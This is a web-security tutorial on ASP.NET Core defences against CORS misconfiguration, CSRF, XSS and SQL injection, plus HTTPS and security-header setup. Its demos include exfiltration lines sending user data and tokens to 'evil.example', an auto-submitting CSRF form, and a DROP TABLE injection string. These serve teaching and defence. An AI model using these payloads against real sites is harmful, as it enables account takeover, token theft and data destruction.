## Browser-Facing Attacks and Defences

### CORS (Cross-Origin Resource Sharing)

**Definition.** An *origin* is `scheme + host + port`. The browser's **same-origin policy** stops JavaScript on `https://evil.example` from *reading* responses from `https://api.shop.example`. **CORS** is the opt-in mechanism a server uses to relax that rule for specific trusted origins, via `Access-Control-*` response headers.

**Why it matters.** Every SPA on a different origin from its API (`https://shop.example` → `https://api.shop.example`, or `localhost:4200` → `localhost:5001`) hits CORS. Misconfiguring it is both the #1 "it works in Postman" bug and a real data-theft vulnerability.

**How it works.** *Simple* requests (GET/HEAD/POST with only basic headers and `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`) are sent directly; the browser then decides whether JS may read the reply. Anything else — `Content-Type: application/json`, an `Authorization` header, `PUT`/`DELETE` — triggers a **preflight**: an `OPTIONS` request asking permission first.

```text
OPTIONS /api/orders HTTP/1.1                     <- preflight (sent by the browser)
Origin: https://shop.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type

HTTP/1.1 204 No Content                          <- server's permission slip
Access-Control-Allow-Origin: https://shop.example
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600                     <- browser caches the answer 1 hour
Vary: Origin

POST /api/orders ...                             <- the real request follows
```

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Spa", policy => policy
        .WithOrigins("https://shop.example", "https://admin.shop.example") // exact origins
        .WithMethods("GET", "POST", "PUT", "DELETE")
        .WithHeaders("Authorization", "Content-Type")
        .WithExposedHeaders("X-Pagination", "ETag")   // headers JS may read
        .AllowCredentials()                            // cookies / auth headers cross-site
        .SetPreflightMaxAge(TimeSpan.FromHours(1)));
});

var app = builder.Build();
app.UseRouting();
app.UseCors("Spa");            // after UseRouting, BEFORE UseAuthentication/UseAuthorization
app.UseAuthentication();       // (a failing preflight must not be blocked by auth)
app.UseAuthorization();
app.MapControllers();          // or per endpoint: [EnableCors("Spa")] / .RequireCors("Spa")
```

**The credentials rule.** When a request carries credentials (cookies, `Authorization`, client certs), the spec forbids `Access-Control-Allow-Origin: *`. ASP.NET Core enforces this: `AllowAnyOrigin()` + `AllowCredentials()` throws `InvalidOperationException: The CORS protocol does not allow specifying a wildcard (any) origin and credentials at the same time.`

:::warn The "fix" that creates a vulnerability
Developers hit that exception and "solve" it with `SetIsOriginAllowed(_ => true).AllowCredentials()`. The server now *reflects whatever Origin it receives* and allows credentials — so `https://evil.example` can read your logged-in users' data:

```javascript
// Running on https://evil.example while the victim is logged in to shop.example
fetch("https://api.shop.example/api/me/orders", { credentials: "include" })
  .then(r => r.json()).then(d => navigator.sendBeacon("https://evil.example/steal", JSON.stringify(d)));
```

Fix: `WithOrigins(...)` an explicit allow-list loaded from configuration per environment; add `Vary: Origin` (ASP.NET Core does).
:::

**Remember:**
- CORS is enforced **by browsers only**. `curl`, Postman and server-to-server calls ignore it — it is not an API security control.
- A CORS failure usually still *executes* simple requests on the server; only the response is hidden. State-changing endpoints therefore still need CSRF protection.
- Dev-time wildcard policies (`AllowAnyOrigin`) are acceptable only for truly public, credential-less APIs (e.g. a public product catalogue).
- Same origin = no CORS: serving the SPA and API under one origin (reverse proxy `/api`) or using a BFF avoids the whole topic.

:::scenario "Works in Postman, fails in the browser" - CORS
Browser console: *"has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present"*. Checklist: (1) is the exact origin (scheme, host, **port**) in `WithOrigins`? `http://localhost:4200` ≠ `http://localhost:4201`. (2) Is `UseCors` placed after `UseRouting` and before `UseAuthorization`? (3) Does the preflight `OPTIONS` get a 2xx — a 401/404/redirect on OPTIONS fails the check; (4) is the request header (e.g. `X-Correlation-Id`) allowed in `WithHeaders`? (5) With cookies, did the client set `credentials: 'include'` / Angular `withCredentials: true` **and** the server `AllowCredentials()` with a non-wildcard origin? (6) Does an exception/500 page bypass the CORS middleware? Fix the real error first — the CORS message often masks a 500.
:::

:::q Why can't you use AllowAnyOrigin together with AllowCredentials?
The browser rejects `Access-Control-Allow-Origin: *` when the request includes credentials, and ASP.NET Core throws at startup to stop you. Allowing every origin to make credentialed calls would let any website act as the logged-in user and read the result. The correct fix is an explicit list of trusted origins.
:::

### CSRF (Cross-Site Request Forgery)

**Definition.** CSRF tricks a victim's browser into sending an *authenticated* request to your site from another site, abusing the fact that browsers **attach cookies automatically**. The attacker cannot read the response but can trigger state changes.

**Attack demo.** The victim is logged in to `shop.example` with a cookie session. They visit `evil.example`:

```html
<!-- evil.example/free-gift.html -->
<form id="f" action="https://shop.example/account/change-email" method="post">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById("f").submit();</script>
<!-- Browser sends POST + the victim's shop.example cookie. Email changed -> password reset -> account takeover. -->
```

**Defences (layer them).**

1. **SameSite cookies.** `Lax` (browser default, and the ASP.NET Core Identity default) stops cookies on cross-site POST/AJAX; `Strict` also blocks them on cross-site link navigation; `None` requires `Secure` and re-opens the hole. "Site" means registrable domain, so sibling subdomains are same-site — a hijacked `blog.shop.example` can still CSRF you.
2. **Antiforgery tokens (synchronizer / double submit).** A random token is placed in a cookie *and* must be echoed in a form field or header that a cross-site page cannot read or set.
3. **Check `Origin`/`Referer`/`Sec-Fetch-Site`** on unsafe methods as defence in depth.
4. **Re-authenticate for critical actions** (change email, payment) with password/MFA.
5. Never change state on `GET`.

```csharp
// MVC / Razor Pages: validate every unsafe request (POST/PUT/PATCH/DELETE) automatically
builder.Services.AddControllersWithViews(o =>
    o.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));
// Razor Pages enable this by default. <form method="post"> auto-emits the hidden token.

// SPA with cookie auth: server hands the request token to JS via a readable cookie,
// JS echoes it in a header (Angular's HttpClient does this for "XSRF-TOKEN" -> "X-XSRF-TOKEN").
builder.Services.AddAntiforgery(o => o.HeaderName = "X-XSRF-TOKEN");

app.UseAuthentication();
app.UseAuthorization();
app.UseAntiforgery();            // .NET 8+: validates form-bound minimal API / Blazor endpoints

app.MapGet("/antiforgery/token", (IAntiforgery af, HttpContext ctx) =>
{
    var tokens = af.GetAndStoreTokens(ctx);        // also sets the .AspNetCore.Antiforgery cookie
    ctx.Response.Cookies.Append("XSRF-TOKEN", tokens.RequestToken!, new CookieOptions
    {
        HttpOnly = false,                            // JS must read it
        Secure = true, SameSite = SameSiteMode.Strict
    });
    return Results.NoContent();
}).RequireAuthorization();

// Token-authenticated JSON endpoints don't need it; opt out explicitly where it would be validated:
app.MapPost("/api/orders", (OrderDto dto) => Results.Ok()).DisableAntiforgery();
```

**Why Bearer-token APIs are (mostly) immune.** The browser never adds an `Authorization: Bearer` header on its own; your JS adds it, and `evil.example`'s JS cannot read your token (storage is per-origin). No ambient credentials, no CSRF. The exceptions: cookie-based auth on the same endpoints, tokens stored in cookies, or an API that accepts *both*.

:::q Do you need antiforgery tokens for a JWT-protected Web API?
Not if the token is sent in the `Authorization` header: nothing is attached automatically, so there is no CSRF surface. The moment auth lives in a cookie — including a BFF or the refresh-token cookie — I need SameSite plus antiforgery or an Origin check on state-changing endpoints.
:::

### XSS (Cross-Site Scripting)

**Definition.** XSS is injecting attacker-controlled script into a page that other users view, so it runs **with your site's origin and privileges** — it can read the DOM, call your API as the user, steal non-HttpOnly storage, and rewrite the page.

| Type | How | Example |
|---|---|---|
| **Stored** | Payload saved in DB, served to everyone | Product review `<script>...</script>` |
| **Reflected** | Payload in the request is echoed straight back | `/search?q=<script>...` rendered in the page |
| **DOM-based** | Client-side JS writes untrusted data to a sink | `el.innerHTML = location.hash` |

```javascript
// Attacker's review text, stored by a naive API and rendered by a naive SPA:
// <img src=x onerror="fetch('https://evil.example/c?t='+localStorage.token)">
reviewDiv.innerHTML = review.text;        // SINK: executes the onerror handler
reviewDiv.textContent = review.text;      // SAFE: treated as text
```

**Defences.**
1. **Output encoding by context** — HTML body, attribute, JavaScript, URL, CSS each need different escaping. Frameworks do it by default; the bugs are the escape hatches.
2. **Never build HTML from strings**; use templating that encodes.
3. **Sanitize** if users may submit HTML (rich text): server-side allow-list sanitiser such as `Ganss.Xss.HtmlSanitizer`, not regex.
4. **Content Security Policy** as a safety net.
5. `HttpOnly` cookies so injected script cannot read the session; keep tokens out of `localStorage`.
6. Validate input (length, format) — helpful, but *not* the primary defence.

```csharp
// Razor encodes automatically
// <p>@Model.Comment</p>              -> &lt;script&gt;alert(1)&lt;/script&gt;
// <p>@Html.Raw(Model.Comment)</p>    -> XSS! Raw() switches the encoder off
```

| Framework | Safe by default | Escape hatch (audit every use) |
|---|---|---|
| Razor / MVC | `@expr` HTML-encodes | `Html.Raw`, `HtmlString`, `<script>` blocks built from data |
| Blazor | `@expr` encodes | `MarkupString` |
| React | JSX `{value}` escapes | `dangerouslySetInnerHTML`, `href={userUrl}` (`javascript:`) |
| Angular | Interpolation + `[innerHTML]` sanitise | `bypassSecurityTrustHtml/Url/Script`, direct `nativeElement.innerHTML` |

**Dangerous DOM sinks:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout("string")`, `element.setAttribute("onclick", ...)`, `location.href = userInput`, jQuery `.html()`.

```csharp
// Content-Security-Policy with a per-request nonce: only scripts WE render may execute
app.Use(async (ctx, next) =>
{
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
    ctx.Items["csp-nonce"] = nonce;                   // use <script nonce="@nonce">
    ctx.Response.Headers["Content-Security-Policy"] =
        $"default-src 'self'; script-src 'self' 'nonce-{nonce}'; " +
        "style-src 'self'; img-src 'self' data:; connect-src 'self' https://api.shop.example; " +
        "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'";
    await next();
});
// Roll out with Content-Security-Policy-Report-Only first, watch reports, then enforce.
```

With that CSP an injected `<script>` or inline `onerror=` handler is blocked even if encoding was missed. A Web API returning JSON is not itself an XSS vector provided `Content-Type: application/json` and `X-Content-Type-Options: nosniff` are set; the danger is how the *client* renders the data.

:::q How does Razor protect you from XSS, and where does it not?
Razor HTML-encodes every `@expression` using `HtmlEncoder`, so `<script>` becomes `&lt;script&gt;`. It does not protect `Html.Raw`, `MarkupString`, data inserted into JavaScript blocks or `href`/`src` attributes without URL validation, or anything the client-side JS does with `innerHTML`. I add a CSP and HttpOnly cookies as a second layer.
:::

## SQL Injection

### SQL Injection in ASP.NET Core

**Definition.** SQL injection happens when untrusted input is concatenated into SQL text so the database parses it as **code** instead of **data**.

**Attack demo.**

```csharp
// VULNERABLE
public Task<List<Product>> Search(string term) =>
    db.Products
      .FromSqlRaw("SELECT * FROM Products WHERE Name LIKE '%" + term + "%'")
      .ToListAsync();

// Attacker sends term = '; DROP TABLE Orders; --
```

```sql
-- What the database receives
SELECT * FROM Products WHERE Name LIKE '%'; DROP TABLE Orders; --%'
```

Another trap: `FromSqlRaw($"... {term}")`. The C# interpolation happens **before** EF sees the string, so it is exactly the same bug. The analyzer warning `EF1002` flags it.

**Fixes (best to worst).**

```csharp
// 1. LINQ — always parameterised. Prefer this.
var products = await db.Products
    .Where(p => p.Name.Contains(term))
    .ToListAsync();
// SELECT ... WHERE [p].[Name] LIKE '%' + @term + '%'   (@term sent as a parameter)

// 2. FromSql / FromSqlInterpolated — each {hole} becomes a DbParameter
var pattern = $"%{term}%";
var viaSql = await db.Products
    .FromSql($"SELECT * FROM Products WHERE Name LIKE {pattern}")
    .ToListAsync();
// SELECT * FROM Products WHERE Name LIKE @p0

// 3. FromSqlRaw with explicit parameters (when SQL text is built conditionally)
var viaRaw = await db.Products
    .FromSqlRaw("SELECT * FROM Products WHERE Name LIKE @term",
                new SqlParameter("term", pattern))
    .ToListAsync();
```

`FromSql(FormattableString)` will not even compile if you pass a plain `string` variable — that is by design. The same holds for `ExecuteSql($"...")` vs `ExecuteSqlRaw`.

```csharp
// ADO.NET and Dapper — always parameters, never concatenation
using var cmd = new SqlCommand("SELECT Id, Name FROM Customers WHERE Email = @email", conn);
cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email;

var customer = await conn.QuerySingleOrDefaultAsync<Customer>(
    "SELECT Id, Name FROM Customers WHERE Email = @email", new { email });
```

**Things parameters cannot do — identifiers.** Table/column names and `ORDER BY` direction cannot be parameters. Use an allow-list:

```csharp
IQueryable<Product> ApplySort(IQueryable<Product> q, string? sort, bool desc) => sort?.ToLower() switch
{
    "price" => desc ? q.OrderByDescending(p => p.Price) : q.OrderBy(p => p.Price),
    "name"  => desc ? q.OrderByDescending(p => p.Name)  : q.OrderBy(p => p.Name),
    _       => q.OrderBy(p => p.Id)             // unknown value -> default, never echoed to SQL
};
```

:::warn Stored procedures are not automatically safe
A proc is safe only if it receives **parameters** and does not build dynamic SQL from them by concatenation:

```sql
-- VULNERABLE: dynamic SQL inside the proc
CREATE PROC dbo.SearchProducts @name NVARCHAR(100) AS
  EXEC('SELECT * FROM Products WHERE Name LIKE ''%' + @name + '%''');

-- SAFE: parameterised dynamic SQL
CREATE PROC dbo.SearchProducts @name NVARCHAR(100) AS
  EXEC sp_executesql
       N'SELECT * FROM Products WHERE Name LIKE ''%'' + @n + ''%''',
       N'@n NVARCHAR(100)', @n = @name;
```
Calling a proc by string-concatenating arguments from C# is equally injectable.
:::

**Defence in depth:** give the app's DB login least privilege (no `db_owner`, no `DROP`); do not return raw SQL errors to clients (use `ProblemDetails`); validate length/format; scan with SAST (CodeQL, SonarQube) and DAST (ZAP).

:::q Does Entity Framework protect you from SQL injection?
For LINQ queries yes — all values are sent as parameters. It does not protect `FromSqlRaw`/`ExecuteSqlRaw` when you concatenate or interpolate input into the string. Use `FromSql`/`FromSqlInterpolated`, which parameterise the interpolation holes, or pass `SqlParameter`s explicitly.
:::

## Transport Security and Headers

### HTTPS, HSTS and Redirection

**Definition.** HTTPS (TLS) encrypts traffic and authenticates the server. **HSTS** (`Strict-Transport-Security`) tells the browser "for the next N seconds only ever use HTTPS for this host", killing SSL-stripping on later visits.

**Why it matters.** Without TLS, bearer tokens, cookies and passwords cross the network in clear text. Without HSTS, the first plain-HTTP request can be intercepted before the redirect to HTTPS.

```csharp
builder.Services.AddHsts(o =>
{
    o.MaxAge = TimeSpan.FromDays(365);   // default is only 30 days
    o.IncludeSubDomains = true;
    o.Preload = true;                    // opt in to browsers' preload list only when sure
});
builder.Services.AddHttpsRedirection(o => o.RedirectStatusCode = StatusCodes.Status308PermanentRedirect);

var app = builder.Build();
if (!app.Environment.IsDevelopment()) app.UseHsts();   // never HSTS on localhost
app.UseHttpsRedirection();
```

**Behind a reverse proxy / App Service / Kubernetes ingress.** TLS usually terminates at the proxy, so Kestrel sees plain HTTP: without forwarded-header handling you get infinite redirect loops and wrong client IPs.

```csharp
builder.Services.Configure<ForwardedHeadersOptions>(o =>
{
    o.ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto;
    // trust only your proxy network (defaults trust loopback only)
    o.KnownNetworks.Add(new IPNetwork(IPAddress.Parse("10.0.0.0"), 8));
});
app.UseForwardedHeaders();               // must be first in the pipeline
```

Other points: local dev certificate via `dotnet dev-certs https --trust`; allow only TLS 1.2/1.3; for **APIs** prefer not listening on HTTP at all, because a redirect still lets the first request (with the token in it) go in clear text.

### Security Headers

| Header | Purpose |
|---|---|
| `Strict-Transport-Security` | Force HTTPS (HSTS) |
| `Content-Security-Policy` | Restrict script/style/frame sources; strongest XSS mitigation |
| `X-Content-Type-Options: nosniff` | Stop MIME sniffing (a JSON/text response being executed as script) |
| `X-Frame-Options: DENY` / CSP `frame-ancestors` | Anti-clickjacking (CSP is the modern one) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Don't leak full URLs (with ids/tokens) to other sites |
| `Permissions-Policy` | Disable camera, mic, geolocation unless needed |
| `Cross-Origin-Opener-Policy: same-origin` | Isolate the browsing context |
| `Cache-Control: no-store` | On responses with personal data |
| Remove `Server` / `X-Powered-By` | Less fingerprinting (`ConfigureKestrel(o => o.AddServerHeader = false)`) |

```csharp
app.Use(async (ctx, next) =>
{
    var h = ctx.Response.Headers;
    h["X-Content-Type-Options"] = "nosniff";
    h["X-Frame-Options"] = "DENY";
    h["Referrer-Policy"] = "strict-origin-when-cross-origin";
    h["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()";
    h["Cross-Origin-Opener-Policy"] = "same-origin";
    await next();
});
// Or use the NetEscapades.AspNetCore.SecurityHeaders package with a fluent policy builder.
```

:::tip Verify, don't assume
Run the site through securityheaders.com or Mozilla Observatory, and OWASP ZAP in the CI pipeline. `X-XSS-Protection` is obsolete — do not rely on it; CSP replaces it.
:::
